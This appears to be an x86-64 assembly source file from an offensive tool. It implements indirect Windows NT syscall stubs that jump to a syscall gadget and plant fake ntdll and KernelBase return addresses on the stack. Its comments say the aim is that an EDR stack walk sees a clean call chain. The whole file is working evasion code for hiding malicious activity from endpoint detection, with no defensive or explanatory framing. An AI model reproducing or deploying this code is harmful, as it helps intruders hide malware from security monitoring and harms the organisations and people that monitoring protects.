# dosyscall.S - Indirect syscall stubs with 2-frame call stack spoofing
#
# DoSyscall  (6 args): RCX=SSN, RDX=gadget, R8=arg1, R9=arg2, stack=arg3..6
# DoSyscall11(11 args): RCX=SSN, RDX=gadget, R8=arg1, R9=arg2, stack=arg3..11
#
# Nt* ABI on entry to gadget:
#   RAX=SSN  R10=arg1  RDX=arg2  R8=arg3  R9=arg4  [RSP+0x28]=arg5..
#
# Spoof strategy:
#   subq $0x10, %rsp  -- open 2 slots at top of stack
#   [RSP+0x00] = g_spoof_frame1  (ntdll ret gadget  -- first  thing ret pops)
#   [RSP+0x08] = g_spoof_frame2  (KernelBase ret gadget -- second)
#   [RSP+0x10] = real return address to our caller  (already there, untouched)
#
#   Chain after syscall;ret:
#     ret@gadget -> ntdll (RSP+0x08)
#     ret@ntdll  -> KernelBase (RSP+0x10)
#     ret@kb     -> real caller (RSP+0x18 = entry_rsp = caller's RSP)
#
#   Only volatile registers used (rax/rcx/rdx/r8/r9/r10/r11).
#   No callee-saved push/pop -- avoids extra frames in the walk.
#
# g_spoof_frame1/g_spoof_frame2 defined in syscalls.c, populated at init.

.text

.globl DoSyscall
.def   DoSyscall; .scl 2; .type 32; .endef

DoSyscall:
    movq  %rdx,  %r11                   # r11  = gadget addr
    movq  %r8,   %r10                   # r10  = arg1
    movq  %r9,   %rdx                   # rdx  = arg2
    movq  0x38(%rsp), %r8               # r8   = arg5 (pre-save before subq)
    movq  0x40(%rsp), %r9               # r9   = arg6 (pre-save)

    subq  $0x10, %rsp                   # open 2 spoof-frame slots

    movq  g_spoof_frame1(%rip), %rax
    movq  %rax,  0x00(%rsp)             # ntdll ret gadget   <- first ret pops
    movq  g_spoof_frame2(%rip), %rax
    movq  %rax,  0x08(%rsp)             # KernelBase ret gadget

    movq  %r8,   0x28(%rsp)             # arg5 -> [RSP+0x28]
    movq  %r9,   0x30(%rsp)             # arg6 -> [RSP+0x30]
    movq  0x38(%rsp), %r8               # arg3 <- [entry+0x28 = new+0x38]
    movq  0x40(%rsp), %r9               # arg4 <- [entry+0x30 = new+0x40]

    movl  %ecx,  %eax                   # eax  = SSN
    jmpq  *%r11                         # jmp syscall;ret -- no call return addr pushed


.globl DoSyscall11
.def   DoSyscall11; .scl 2; .type 32; .endef

DoSyscall11:
    movq  %rdx,  %r11                   # r11  = gadget addr
    movq  %r8,   %r10                   # r10  = arg1
    movq  %r9,   %rdx                   # rdx  = arg2

    subq  $0x10, %rsp                   # open 2 spoof-frame slots

    movq  g_spoof_frame1(%rip), %rax
    movq  %rax,  0x00(%rsp)             # ntdll ret gadget
    movq  g_spoof_frame2(%rip), %rax
    movq  %rax,  0x08(%rsp)             # KernelBase ret gadget

    movq  0x38(%rsp), %r8               # arg3 <- [entry+0x28 = new+0x38]
    movq  0x40(%rsp), %r9               # arg4 <- [entry+0x30 = new+0x40]

    # Shift arg5..arg11 from [new+0x48..0x78] to [new+0x28..0x58]
    # Safe order: ascending dest, all sources are above all dests
    movq  0x48(%rsp), %rax; movq %rax, 0x28(%rsp)   # arg5
    movq  0x50(%rsp), %rax; movq %rax, 0x30(%rsp)   # arg6
    movq  0x58(%rsp), %rax; movq %rax, 0x38(%rsp)   # arg7  ([0x38] had arg3, now in r8)
    movq  0x60(%rsp), %rax; movq %rax, 0x40(%rsp)   # arg8  ([0x40] had arg4, now in r9)
    movq  0x68(%rsp), %rax; movq %rax, 0x48(%rsp)   # arg9  ([0x48] had arg5, already copied)
    movq  0x70(%rsp), %rax; movq %rax, 0x50(%rsp)   # arg10
    movq  0x78(%rsp), %rax; movq %rax, 0x58(%rsp)   # arg11

    movl  %ecx,  %eax                   # eax  = SSN
    jmpq  *%r11                         # jmp syscall;ret


.globl DoSleepSpoof
.def   DoSleepSpoof; .scl 2; .type 32; .endef

# DoSleepSpoof — 4-frame spoof chain for NtDelayExecution / 2-arg sleeps
#
# Entry: RCX=SSN, RDX=gadget, R8=Alertable, R9=pInterval
#
# Stack after subq $0x20:
#   [RSP+0x00] = g_spoof_frame1  (ntdll gadget 1)
#   [RSP+0x08] = g_spoof_frame3  (ntdll gadget 2)
#   [RSP+0x10] = g_spoof_frame4  (ntdll gadget 3)
#   [RSP+0x18] = g_spoof_frame2  (KernelBase gadget)
#   [RSP+0x20] = real return addr (untouched; 5th ret restores RSP perfectly)
#
# EDR stack walk sees: syscall → ntdll1 → ntdll2 → ntdll3 → KernelBase → real caller

DoSleepSpoof:
    movq  %rdx,  %r11                   # r11 = syscall gadget
    movq  %r8,   %r10                   # r10 = Alertable  (NT arg1)
    movq  %r9,   %rdx                   # rdx = pInterval  (NT arg2)
    xorq  %r8,   %r8                    # r8  = 0
    xorq  %r9,   %r9                    # r9  = 0

    subq  $0x20, %rsp                   # open 4 spoof-frame slots

    movq  g_spoof_frame1(%rip), %rax
    movq  %rax,  0x00(%rsp)             # ntdll gadget 1  <- first ret pops
    movq  g_spoof_frame3(%rip), %rax
    movq  %rax,  0x08(%rsp)             # ntdll gadget 2
    movq  g_spoof_frame4(%rip), %rax
    movq  %rax,  0x10(%rsp)             # ntdll gadget 3
    movq  g_spoof_frame2(%rip), %rax
    movq  %rax,  0x18(%rsp)             # KernelBase gadget

    movl  %ecx,  %eax                   # eax = SSN
    jmpq  *%r11                         # jmp syscall;ret — 5 rets balance 5 slots
